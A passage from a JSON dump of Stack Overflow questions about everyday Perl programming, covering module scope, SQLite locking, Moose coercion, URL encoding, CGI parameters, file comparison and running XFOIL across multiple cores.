machine.</p>\n"},{"tags":["perl","scope","require"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12517745,"title":"Make required script use variables from another required script","body":"<p>I have two modules: test1 and test2 and I need to run their subroutines in sequence. They need to modify the same variable $var and the outer script needs to print the final result. This unfortunately doesn't work, and seems to be very similar to this <a href=\"http://stackoverflow.com/questions/7542120/perl-how-to-make-variables-from-requiring-script-available-in-required-script\">S.O. Question</a>.</p>\n\n<pre><code>#test1.pm\nuse strict;\npackage test1;\nmy $var;\nsub step1 {\n  $var = \"Hello\";\n}\n1;\n\n#test2.pm\nuse strict;\npackage test2;\nmy $var;\nsub step1 {\n    $var = $var.\" World!\\n\";\n}\n1;\n\n#execTests.pl\nuse strict;\nrequire test1;\nrequire test2;\n&amp;test1::step1;\n&amp;test2::step1;\nprint $test2::var;\n</code></pre>\n\n<p>How do I make $var be included in the same scope of both required packages?</p>\n"},{"tags":["mysql","perl","entropy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12518591,"title":"Generating Entropy on Multiple Arrays and output to MySQL","body":"<p>I have a program that produces a hash of arrays based on MySQL data.  Each array has numerical values in it.  Using Perl, how do I generate the entropy of each array and output the results in a seperate MySQL table?  The new table should have the columns: </p>\n\n<pre><code> ID         Array           Entropy\n -----      -----           -----\n 1          topic(key)      entropy of all values belonging to the topic\n</code></pre>\n\n<p>Here is the current program that generates the hash of arrays:</p>\n\n<pre><code>my %values_by_topic; \nmy $sth = $dbh-&gt;prepare('SELECT Topic, Value FROM Table'); \n$sth-&gt;execute(); \nwhile (my $row = $sth-&gt;fetch()) {    \n   my ($topic, $value) = @$row;     \n   push @{ $values_by_topic{$topic} }, $value; \n}\n</code></pre>\n"},{"tags":["perl","sqlite","sqlite3"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":510,"score":2,"question_id":6652882,"title":"Limits of multithreaded INSERTS in sqlite","body":"<p>my perl script is multi threaded and in each thread i have to write something to a sqlite3 database. But as you might guess, i get a lot of </p>\n\n<blockquote>\n  <p>DBD::SQLite::db do failed: database is locked at script.pl line 264.</p>\n</blockquote>\n\n<p>messages. I read that sqlite3 is able to handle multi threaded situations, even INSERT statements but i think i expect to much when inserting fro 8 threads at the same time.</p>\n\n<p>ok, so its not possible this way but isn't there a possibility to perform a check before inserting to see if the database is locked (or busy) and then wait until is free again?</p>\n\n<p>I really don't want to change to a \"real\" DBMS cause its only a simple script.</p>\n\n<p>Thank you</p>\n"},{"tags":["perl","httpwebrequest","escaping"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":3000,"score":5,"question_id":449158,"title":"How do I encode HTTP GET query strings in Perl?","body":"<p>This question is somewhat related to <a href=\"http://stackoverflow.com/questions/134858/whats-the-simplest-way-to-make-a-http-get-request-in-perl\">Whatâs the simplest way to make a HTTP GET request in Perl?</a>.</p>\n\n<p>Before making the request via <code>LWP::Simple</code> I have a hash of query string components that I need to serialize/escape. <strong>What's the best way to encode the query string?</strong> It should take into account spaces and all the characters that need to be escaped in valid URIs. I figure it's probably in an existing package, but <strong>I'm not sure how to go about finding it.</strong></p>\n\n<pre><code>use LWP::Simple;\nmy $base_uri = 'http://example.com/rest_api/';\nmy %query_hash = (spam =&gt; 'eggs', foo =&gt; 'bar baz');\nmy $query_string = urlencode(query_hash); # Part in question.\nmy $query_uri = \"$base_uri?$query_string\";\n# http://example.com/rest_api/?spam=eggs&amp;foo=bar+baz\n$contents = get($query_uri);\n</code></pre>\n"},{"tags":["perl","moose","type-coercion"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12485673,"title":"Coercing ArrayRef[MyClass] from ArrayRef[HashRef]","body":"<p>In trying to answer <a href=\"http://stackoverflow.com/q/12483775/468327\">How to instantiate Moose classes from a big hash</a>, I think I have hit another place where I don't fully understand Moose type coercions. For some reason, the below code issues warnings:</p>\n\n<pre><code>You cannot coerce an attribute (departments) unless its type (ArrayRef[Company::Department]) has a coercion at ./test.pl line 12.\nYou cannot coerce an attribute (employees) unless its type (ArrayRef[Company::Person]) has a coercion at ./test.pl line 23.\n</code></pre>\n\n<p>but then succeeds.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse warnings;\nuse strict;\n\npackage Company;\nuse Moose;\nuse Moose::Util::TypeConstraints;\n\nhas 'id'   =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'name' =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'departments' =&gt; (is =&gt; 'ro', isa =&gt; 'ArrayRef[Company::Department]', coerce =&gt; 1);\n\ncoerce 'ArrayRef[Company::Department]',\n  from 'ArrayRef[HashRef]',\n  via { [ map { Company::Department-&gt;new($_) } @$_ ] };\n\npackage Company::Department;\nuse Moose;\n\nhas 'id'   =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'name' =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'employees' =&gt; (is =&gt; 'ro', isa =&gt; 'ArrayRef[Company::Person]', coerce =&gt; 1);\n\npackage Company::Person;\nuse Moose;\nuse Moose::Util::TypeConstraints;\n\nhas 'id'         =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\nhas 'name'  =&gt; (is =&gt; 'ro', isa =&gt; 'Str');\nhas 'age'        =&gt; (is =&gt; 'ro', isa =&gt; 'Num');\n\ncoerce 'ArrayRef[Company::Person]',\n  from 'ArrayRef[HashRef]',\n  via { [ map { Company::Person-&gt;new($_) } @$_ ] };\n\npackage main;\n\nmy %hash = (\n    company =&gt; {\n        id =&gt; 1,\n        name =&gt; 'CorpInc',\n        departments =&gt; [\n            {\n                id =&gt; 1,\n                name =&gt; 'Sales',\n                employees =&gt; [\n                    {\n                        id =&gt; 1,\n                        name =&gt; 'John Smith',\n                        age =&gt; '30',\n                    },\n                ],\n            },\n            {\n                id =&gt; 2,\n                name =&gt; 'IT',\n                employees =&gt; [\n                    {\n                        id =&gt; 2,\n                        name =&gt; 'Lucy Jones',\n                        age =&gt; '28',\n                    },\n                    {\n                        id =&gt; 3,\n                        name =&gt; 'Miguel Cerveza',\n                        age =&gt; '25',\n                    },\n                ],\n            },\n        ],\n    }\n);\n\nmy $company = Company-&gt;new($hash{company});\nuse Data::Dumper;\nprint Dumper $company;\n</code></pre>\n\n<p>How should this have been done? P.S. I tried simply doing </p>\n\n<pre><code>coerce 'Company::Department',\n  from 'HashRef',\n  via { Company::Department-&gt;new($_) };\n</code></pre>\n\n<p>but it died horribly.</p>\n"},{"tags":["perl","hostname"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12516099,"title":"Script to change hostname on CentOS","body":"<p>I using <code>curl</code> to pull a hostname from a server using a HTTP get request, and that is working fine. I need my script to modify the <code>/etc/sysconfig/network</code> file so I don't have to restart the system to apply the hostname.</p>\n\n<p>Here is my code thus far:</p>\n\n<pre><code>#!/usr/local/bin/perl\n\nuse strict;\nuse warnings;\nuse Sys::Hostname;\n\n\nmy $curl = `curl http://100.10.10.10/hostname`; # Get correct hostname \nmy $host = hostname;\n\nif ($curl ne $host) {\n   # Need to modify the /etc/sysconfig/network file to replace hostname or add it.\n}\n</code></pre>\n\n<p>EDIT:\nMy Actual Question: What is the best way for me to modify that file with the new hostname?</p>\n"},{"tags":["performance","perl","reference","alias","copy-on-write"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12514234,"title":"alias a hash element in perl","body":"<p>Is it possible to access the same value under different hash keys?  How can I tell Perl not to copy the \"very long text?\"</p>\n\n<pre><code>$hash-&gt;{'key'} = 'very long text';\n$hash-&gt;{'alias'} = $hash-&gt;{'key'};\n</code></pre>\n"},{"tags":["perl","hash","pattern-matching"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12511678,"title":"grab multiple lines after a matching line in Perl iteratively?","body":"<p>I want a hash structure, each line starting with a <strong>></strong> is the key and the lines up to the next <strong>></strong> are the value for that key:</p>\n\n<pre><code>while (&lt;DATA&gt;) {\n    $line1 = $_;\n    chomp($line1);\n\n    if ($line1 =~ /^&gt;/) {\n        while (&lt;DATA&gt;) {\n            last if $line1 =~ /^&gt;/;\n            $value .= $_;\n        }\n        $hash{$line1} = $value;\n    }\n}\n\nforeach my $key(%hash) {\n    print \"$key :$hash{$key}\\n\";\n}\n\n__DATA__\n&gt;label1 \nline1\\n\nline2\\n\n&gt;label2\nline1\\n\nline2\\n\n</code></pre>\n"},{"tags":["perl","r"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12513261,"title":"Merging consecutive rows in R dataframe if columns are same","body":"<p>I am trying to convert one of my Perl script to R script. I have a dataframe in R which looks like (Ignore the column names)-</p>\n\n<pre>CHR     START          END      TYPE\nchr1    945493         945593   normal\nchr1    945593        947374    normal\nchr1    947374        947474    normal\nchr1    947474        947574    gain\nchr1    947574        947674    gain\nchr1    947674        960364    gain\nchr1    960364        960464    normal\nchr22   17290491    17290591    normal\nchr22   17290591    17290691    normal\nchr22   17290691    17290791    gain\nchr22   17290791    17292513    gain\nchr22   17292513    17292613    gain\nchr22   17292613    17292713    gain\nchr22   17292713    17293046    gain\nchr22   17293346    17298475    gain\nchr22   17298475    17298575    gain\nchr22   17298575    17298675    normal\nchr22   17298675    17303632    normal\nchr22   17303632    17303732    loss\nchr22   17303732    17303832    normal\nchrX    154162621   154181221   normal\nchrX    154181221   154181321   normal\nchrX    154181321   154181421   loss\nchrX    154181421   154181521   loss\nchrX    154181521   154181621   loss\nchrX    154181621   154181721   loss\nchrX    154181721   154216867   loss\nchrX    154216867   154216967   normal\nchrX    154216967   154217067   normal\nchrX    154217067   154217167   normal</pre>\n\n<p>If at least 5 continuous rows have same value in \"CHR\" column and \"TYPE\" column, then combine all those rows in one row so that START column should have value of first row and END column have value of last row and in the end just return rows which have \"gain\" or \"loss\" TYPE. So the desired output is:</p>\n\n<pre>chr22   17290691        17298575        gain\nchrX    154181321       154216867       loss</pre>\n\n<p>What I am doing right now is:</p>\n\n<ol>\n<li>Saving the dataframe with \"write.table\".</li>\n<li><p>Use this perl script:</p>\n\n<pre><code>  open $first, \"&lt;\",$ARGV[0] or die \"Unable to open input file: $!\";\n  my $count=1;\n  $_ = &lt;$first&gt;;\n  chomp;\n  my ($p_key, $p_col1, $p_col2,$p_cnv) = split;\n\n  while(&lt;$first&gt;) {\n      chomp;\n      my ($key, $col1, $col2,$cnv) = split;\n      if ($key eq $p_key and $cnv eq  $p_cnv) {\n        $p_col2 = $col2;\n        $count++;\n\n      } elsif ($count &gt; 4){\n\n\n         print $p_key,\"\\t\", $p_col1,\"\\t\", $p_col2,\"\\t\", $p_cnv,\"\\n\" if($p_cnv eq \"gain\" or $p_cnv eq \"loss\");\n         ($p_key, $p_col1, $p_col2, $p_cnv) = ($key, $col1, $col2, $cnv);\n         $count=1;\n        }\n\n       else { \n\n    ($p_key, $p_col1, $p_col2, $p_cnv) = ($key, $col1, $col2, $cnv);\n        $count=1;\n       }\n}\n</code></pre></li>\n</ol>\n\n<p>I think this is an extra step to save the dataframe first and then use Perl script. Could anyone please suggest an easier way to do this in R - any package or any other trick?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12474063,"title":"Spreadsheet::ParseExcel module in perl","body":"<p>I always gets confused when I deal with Classes and Objects. As I am trying to understand the  <code>Spreadsheet::ParseExcel</code> module, I am having some doubts for its classes and object : </p>\n\n<p>My doubt is: </p>\n\n<p>With <code>$parser= Spreadsheet::ParseExcel-&gt;new();</code>, we are creating an object for <code>Spreadsheet::ParseExcel</code> and after this we shall create the object for <code>Spreadsheet::ParseExcel::Workbook</code>.<br>\nWhy can not we create the object directly for  <code>Spreadsheet::ParseExcel::Workbook</code> and start parsing ?  </p>\n\n<p>Thanks  </p>\n"},{"tags":["regex","perl","tabular-form"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":87,"score":1,"question_id":12362343,"title":"Tabulation of data in perl","body":"<p>I have the input format as below, I want to create a tablular format for these data.</p>\n\n<pre><code>CELL    = \"abc\"\n        \"model\"         \"abc\"\n        \"description\"   \"qwerty+keypad with slide\"\n**tech**\n        size    (big \\$l \\$w m)\n        termOrder         (x y z)\n        namePrefix        \"S\"\n        prop       (nil \\$l l \\$w w)\n    **spec**\n        term      (nil C \\:1 B \\:2 E \\:3)\n        termOrder         (x y z)\n***********************************************************\n CELL    = \"efg\"\n        \"model\"        \"efg\"\n        \"description\"  \"touchscreen+qwerty no slide\"\n**tech**\n        size    (small \\$l \\$w m)\n        termOrder         (x y z)\n        namePrefix        \"S\"\n        prop       (nil \\$l l \\$w w)\n **spec**\n        term          (nil x \\:1 y \\:2 z \\:3)\n        termOrder         (x y z)\n</code></pre>\n\n<p>I want a table with names on left as headers and the data on the right to be its values.</p>\n\n<pre><code>.                                         tech                            spec   \nCELL   model   description   size   termOrder   namePrefix  prop  termOrder Term       \n</code></pre>\n\n<p>These are the headers and i want the corresponding values below these headers\nI tried using this code which i had used for another kind of tabulation </p>\n\n<pre><code>my $pr      = \"%-12s\";  \nmy @headers = qw/............../;  \nmy %names;\n\nwhile (&lt;DATA&gt;) {          \n\n    chomp;          \n    my $line = &lt;DATA&gt;;          \n    %{$names{$_}} = split /=|\\s+/, $line;  \n} \n\nprintf $pr x @headers . \"\\n\", @headers;  \n\nfor (keys %names) {\n\n    my @ds = ($_);          \n    for my $k (@headers[1 .. $#headers]) {     \n\n        my $v = $names{$_}-&gt;{$k};                 \n        push @ds, $v ? $v : '-';\n    }         \n    printf $pr x @ds . \"\\n\", @ds;\n } \n</code></pre>\n\n<p>This doesn't yield a required result so kindly help me out with this.                      </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":12512515,"title":"perl variable in file","body":"<p>Can someone show me how to make an if statement with perl which checks if a variable is present in an entire file-</p>\n\n<pre><code>if (variable in file)\n{\ndo something;\nelse\n{\ndo something else;\n}\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["perl","module","require"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12511621,"title":"'Can't locate file.pl in @INC...' error in Perl","body":"<p>I have a folder with several <code>.pl</code> files that run through <code>main.pl</code>. I have successfully had these working by using <code>require 'file.pl';</code> at the beginning of the main file. I have used some modules, too, without issue. </p>\n\n<p>I am now trying to use a 'home-made' module, but when I add <code>use Add::Location::CSearch qw(c_search);</code> to the top of the file that it is being used in (or the top of the main file) and run the main file, it produces the <code>Can't locate file.pl in @INC...</code> error with <code>file.pl</code> being the first file in the <code>require</code> list in the main file. </p>\n\n<p>From how I understand it, after adding the <code>use</code> line it now tries to find all the <code>require</code> in that same directory. The <code>(@INC contains: ...)</code> at the end of the error message lists some library/module folders. It also has <code>.</code> at the end for the current directory.</p>\n\n<p>I hope I have explained this well; it is confusing! I don't know why this happens and how to solve it, so I would be grateful for any ideas.</p>\n\n<p>Edit: Sample Code</p>\n\n<pre><code>main.pl\n\n#!/usr/bin/perl\npackage testpack;\n\nuse lib '/hlib/...';\nuse Add::DB;\nuse List::Util qw(sum);\nuse List::MoreUtils qw(uniq);\nuse List::MoreUtils qw(firstidx);\nuse strict;\nuse warnings;\n\nrequire 'file1.pl';\nrequire 'file2.pl'; \nrequire 'file3.pl';\n\n.\n.\n.\n\nfile1.pl\n\n#!/usr/bin/perl\npackage testpack;\nuse Add::Location::CSearch qw(c_search);\n</code></pre>\n\n<p>This is all that really counts for the problem... the rest of the files have working code that calls subroutines etc. </p>\n"},{"tags":["perl","replace","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12511832,"title":"sed or perl replace characters leaving some text intact","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12490806/sed-replace-characters-leaving-some-text-intact\">sed replace characters leaving some text intact</a>  </p>\n</blockquote>\n\n\n\n<p>how to replace some characters using sed (or maybe perl), but leaving unknown number intact in.e. in file there are multiple lines like this:</p>\n\n<pre><code>&lt;\"START=xxx\"&gt;\n&lt;\"START=yyy\"&gt;\n&lt;\"START=zzz\"&gt;\n</code></pre>\n\n<p>The 'xxx', 'yyy' and 'zzz' are different unknown values (numbers). I want to remove ending \"> and replace it, also replace the beginning (but that's not to difficult for me) so in the end the file looks like this:</p>\n\n<pre><code>&lt;START&gt;xxx&lt;/START&gt;\n&lt;START&gt;yyy&lt;/START&gt;\n&lt;START&gt;zzz&lt;/START&gt;\n</code></pre>\n\n<p>Thank you in advance!</p>\n"},{"tags":["perl","statistics"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12503257,"title":"How do I split ONE array to two separate arrays based on magnitude size and a threshold?","body":"<p>I have an array which has BIG numbers and small numbers in it. I got it from after running a log from WireShark.</p>\n\n<p>This is how the Array look like (for bytes send) :</p>\n\n<pre><code>@Array=qw(10912980\n10924534\n10913356\n10910304\n10920426\n10900658\n10911266\n10912088\n10928972\n10914718\n10920770\n10897774\n10934258\n10882186\n10874126\n8531\n8217\n3876\n8147\n8019\n68157\n3432\n3350\n3338\n3280\n3280\n7845\n7869\n3072\n3002\n2828\n8397\n1328\n1280\n1240\n1194\n1193\n1192\n1194\n6440\n1148\n1218\n4236\n1161\n1100\n1102\n1148\n1172\n6305\n1010\n5437\n3534\n4623\n4669\n3617\n4234\n959\n1121\n1121\n1075\n3122\n3076\n1020\n3030\n628\n2938\n2938\n1611\n1611\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n1541\n583\n370\n178)\n</code></pre>\n\n<p>When you look at these this array carefully, one thing is obvious to the human eye. There are really BIG numbers and small numbers. I want to split the array to two different arrays. That would require me to set a threshold. Array 1 should be ONLY the BIG numbers (10924534-10874126), and array 2 should be the smaller numbers (68157-178). Btw, the array is not sorted. User will NOT input the threshold, and hence should be determined smartly.</p>\n\n<p>Can you help me?</p>\n"},{"tags":["regex","perl","append"],"answer_count":7,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":122,"score":1,"question_id":12455538,"title":"Append a string in the beginning of a line when regex matches","body":"<p>I have a file for example</p>\n\n<pre><code>Car   class    rating\nford    c        ok\nmerc    a        Vgood\nBMW     a        Toogood\nkia     c         ok\n</code></pre>\n\n<p>I want to append 'prefer' and 'dontprefer' at the beginning of the line when \"a\" and \"c\" are found respectively.</p>\n\n<p>I have been doing this by seperating lines with \"a\" and \"c\" into different files and then append the required.</p>\n\n<pre><code>perl -ne '/a/ &amp;&amp; print' file1.l &gt; file2.l \n\nperl -ple 's/^/prefer/' file2.l\n</code></pre>\n\n<p>I have been doing this for each regex match and then combine all the files once appeneded.</p>\n\n<p>So it there any other simple code to append the strings in the same file instead of shanging the files each time a regex is matched?</p>\n\n<p>Sample output:</p>\n\n<pre><code>  .  .          Car   class    rating\n\ndontprefer    ford    c        ok\nprefer        merc    a        Vgood\nprefer        BMW     a        Toogood\ndontprefer    kia     c         ok\n</code></pre>\n"},{"tags":["perl","eval","round"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12509251,"title":"How can I round an evalue in Perl?","body":"<p>I have an evalue number like: <code>3,49489484848484E-23</code> and want to round it to \n<code>3,48E-23</code></p>\n\n<p>How can I do it? I can't found any Perl functions that do this rounding.</p>\n"},{"tags":["regex","perl","compare"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12470017,"title":"Comparison between 2 files and printing the difference between them in a sequential manner","body":"<p>I have 2 files namely</p>\n\n<pre><code>**a.txt**\ncars\nbikes\nbus \nvehicle\natv\n\n**b.txt**\nhawk\nhero\natv\nbus\n\n***result.txt***\ncars\nbikes\nvehicle\nhawk\nhero\n</code></pre>\n\n<p>I want to print the difference between the 2 files. Now I have tried a code but it gives me the difference in a random manner; I want it to display it in a proper sequential manner. Can anyone help me out in this.</p>\n\n<pre><code>use strict;\nmy %results = ();  \n\nopen FILE1, \"&lt;a.txt\"\n    or die \"Could not open file: $! \\n\"; \nwhile (my $line = &lt;FILE1&gt;) {\n\n    $results{$line}=1; \n} \nclose FILE1;  \n\nopen FILE2, \"&lt;b.txt\" \n    or die \"Could not open file: $! \\n\"; \nwhile (my $line = &lt;FILE2&gt;) {\n\n    $results{$line}++; \n} \nclose FILE2;\n\nopen OUTFILE, \"&gt;&gt;result.txt\" \n    or die \"Cannot open $outfile for writing \\n\";\nforeach my $line (keys %results) { \n\n    print OUTFILE $line if $results{$line} == 1; \n} \n\nclose OUTFILE; \nclose OUTFILE1;\n</code></pre>\n\n<p>The output that I am getting with this code is</p>\n\n<pre><code>***result.txt***\ncars\nhawk\nbikes\nhero\nvehicle\n</code></pre>\n"},{"tags":["perl","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12508076,"title":"Sort any random list of files by modification date","body":"<p>Looking for generic way how to sort a random list of files by its modification time, so something like:</p>\n\n<pre><code>./make_list_of_files | some_sorter_by_mtime\n</code></pre>\n\n<p>my currect solution is (here the <code>make_list_of_files</code> is the <code>find</code> command):</p>\n\n<pre><code>find / -type f -print |\\\n  perl -nle 'push @in,$_;END {@out = sort{ (stat($a))[9] &lt;=&gt; (stat($b))[9] } @in; $,=\"\\n\";print @out}'\n</code></pre>\n\n<p>exists some simpler solution (e.g. without perl)?</p>\n"},{"tags":["perl","module","cpan","data-transfer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12485847,"title":"Transferring perl modules (RHEL)","body":"<p>I have need to install a couple perl modules onto my test environment (JSON and JSON::XS).\nHowever, the test environment, which mirrors production, can't have gcc installed.\nI do have a dev environment with gcc installed. I've used CPAN to download and compile these modules.</p>\n\n<p>The issue is, how can I migrate them now from my dev environment to my UAT (and ultimately production) environments? All the environments are identical architecture, etc.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["perl","variables","cgi","action","mode"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12505219,"title":"CGI Perl - changing action and mode variables","body":"<p>I am somewhat of a novice with CGI Perl and am working on a web app that uses 'mode' and 'action' variables to determine which pages load.</p>\n\n<pre><code>$mode   = param('mode');\n$action = param('action');\n\n  if ($mode eq 'page1') {\n\n      if ($action 'eq') {\n\n          &amp;performAction;\n      }\n      displayPage1;\n  }\n  elsif ($mode eq 'page2') {\n\n      &amp;displayPage2\n  }\n</code></pre>\n\n<p>During development I have been having trouble figuring out the best way to set these variables when trying to navigate to different modes/actions after a form submit.</p>\n\n<p>In some cases, putting a hidden value in the form will work</p>\n\n<pre><code>hidden(-name=&gt;'action',-value=&gt;'save')\n</code></pre>\n\n<p>but sometimes it will not. In case of the latter,  putting param('action',\"save\") before the form will make the action change when the form is submitted.\n<strong>I am unable to figure out why this happens though, are there factors that affect these two variables that I am unaware of?</strong></p>\n\n<p>What I now need to do is have two buttons on the same form, one which will just set the action to save the form data, and another which will save the form data but navigate to another mode/page with that form data.</p>\n\n<p><strong>If anyone could at least point me in the right direction for what I should be researching I would be greatly appreciative.</strong></p>\n"},{"tags":["arrays","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12507687,"title":"Array assignment in Perl","body":"<p>What is the difference between </p>\n\n<pre><code>myArr1 =&gt; \\@existingarray\n</code></pre>\n\n<p>and </p>\n\n<pre><code>myArr2 =&gt; [\n              @existingarray\n          ]\n</code></pre>\n\n<p>I am assigning the <code>@existingarray</code> to a element in a hash map.</p>\n\n<p>I mean what exactly internally happens. Is it that for the first one,  it points to the same array and for the second array it creates a new array with the elements in the <code>@existingarray</code></p>\n\n<p>Thanks in advance</p>\n"},{"tags":["perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12499892,"title":"Is it Possible to change Worksheet names when useing ParseExcel?","body":"<p>Wrote a Perl script to parse an existing Excel workbook using <a href=\"http://p3rl.org/Spreadsheet%3a%3aParseExcel\" rel=\"nofollow\">Spreadsheet::ParseExcel</a> (as a template), and create new file while adding updated data from our DB.</p>\n\n<p>Is there a way to update the name of the individual worksheets prior to running the SaveAs function? I'd like to rename them to a customer number instead of the default Sheet1, Sheet2, etc. I did read the PerlDoc's and did see there is a <code>get_name()</code> option, but nothing to change and re-save. </p>\n\n<p>Any help would be great.</p>\n"},{"tags":["regex","perl"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12485828,"title":"Perl regexp how to get the file name out?","body":"<p>I have this directory path:</p>\n\n<pre><code>\\main\\ABC_PRD\\ABC_QEM\\1\\testQEM.txt\\main\\ABC_QEM\\1\n</code></pre>\n\n<p>How can I get the file name <code>testQEM.txt</code> from the above string?</p>\n\n<p>I use this:</p>\n\n<pre><code>$file =~ /(.+\\\\)(.+\\..+)(\\\\.+)/;\n</code></pre>\n\n<p>But get this result:</p>\n\n<pre><code>file = testQEM.txt\\main\\ABC_QEM\n</code></pre>\n\n<p>Thanks,</p>\n\n<p>Jirong</p>\n"},{"tags":["perl","serialization","hashmap"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":93,"score":2,"question_id":12502232,"title":"In Perl how can I save a hash that contains subroutine references?","body":"<p>As the title says, in Perl, how can I save a hash that contains a list of subroutine references? For example, I have the following hash that contains the references to the subroutines which are contained in other libraries:</p>\n\n<pre><code>my %testMap = (\n  helloTest        =&gt; \\&amp;runHello,\n  goodbyeTest      =&gt; \\&amp;runGoodbye,\n);\n</code></pre>\n\n<p>When I try to use <a href=\"http://search.cpan.org/~smueller/Data-Dumper-2.131/Dumper.pm\" rel=\"nofollow\">Data::Dumper</a> in the following matter:</p>\n\n<pre><code>my($out) = new FileHandle \"&gt;$fileName\"; \nmy $serialized =&gt; Data::Dumper-&gt;Dump([\\%testMap], [$HASH_REFERENCE]); \nprint $out $serialized; \nclose $out;\n</code></pre>\n\n<p>I end up with a file that looks like the following:</p>\n\n<pre><code>$testMap = {\n             'goodbyeTest' =&gt; sub { \"DUMMY\" },\n             'helloTest' =&gt; sub { \"DUMMY\" }\n           };\n</code></pre>\n\n<p>When I would like the output to look like what appears in the original listing, is there a way to do this?</p>\n\n<p>Some experimentation with Data::Dumper and <a href=\"http://search.cpan.org/~ams/Storable-2.39/Storable.pm\" rel=\"nofollow\">Storable</a> have so far turned up nothing and I suspect that it is due to the actual code for the references not being available to the code that is running.</p>\n"},{"tags":["html","css","perl","cpan"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12488422,"title":"Removing inline CSS from HTML files using Perl","body":"<p>We have about 100+ HTML files which were written years ago and all of those files contain inline CSS. Now we are trying to extract out the CSS from those files and create separate files for CSS (stylesheets). So in this process first we want to clean all our HTML files (removing CSS from them). </p>\n\n<p>I want to know is there any perl module which can do this job? I searched on CPAN but didn't get any. Perhaps my search query was not matching with desired module. Let me know if there exists such module. If it doesn't then I'm gonna write a module for that.</p>\n"},{"tags":["perl","telnet","win32ole"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12169776,"title":"executing win32ole script on remote windows machine through telnet","body":"<p>I am trying to create a word document on a remote windows machine. What I am trying is to telnet to the remote windows machine and run a perl script that creates word document through Win32::OLE. But it doesn't seem to work. Is this possible? Because my script has {visible} set to 1 but will that telnet session have access to instances of word application? Atleast I tried it didn't work. </p>\n"},{"tags":["perl","multicore"],"answer_count":3,"favorite_count":9,"up_vote_count":12,"down_vote_count":0,"view_count":5046,"score":12,"question_id":1961682,"title":"How can I make my Perl script use multiple cores for child processes?","body":"<p>I'm an aerospace engineering student, and I'm working on a senior capstone project. One of the mathematical models I'm developing requires an astronomical amount of generated data from XFOIL, a popular aerospace tool used to find the lift and drag coefficients on airfoils. (But I'm digressing.)</p>\n\n<p>Cut to the chase: I have a Perl script that calls XFOIL repeatedly with different input parameters to generate the data I need. I need XFOIL to run 5600 times, and as it stands right now it takes about 100 seconds on average per run. Doing the math, this means it will take about 6.5 days to complete.</p>\n\n<p>Now, I have a quad-core machine, but my experience as a programmer is limited, and I really only know how to use basic Perl. I would like to run 4 instances of XFOIL at a time, all on their own core. Something like this:</p>\n\n<pre><code>while (1){\n    for (i = 1..4){\n        if (! exists XFOIL_instance(i)){\n            start_new_XFOIL_instance(i, input_parameter_list);\n        }\n    }\n}\n</code></pre>\n\n<p>So the program is checking (or preferably sleeping until an XFOIL instance wakes it up to start a new instance) if every core is running XFOIL. If not, the previous instance exited and we can start a new instance with the new input parameter list.</p>\n\n<p>If anyone has any idea how this can be achieved, please let me know. This would significantly speed up the time I need to generate data and will let me work on the aerospace project itself.</p>\n\n<p>Thanks for the help!</p>\n"}]}
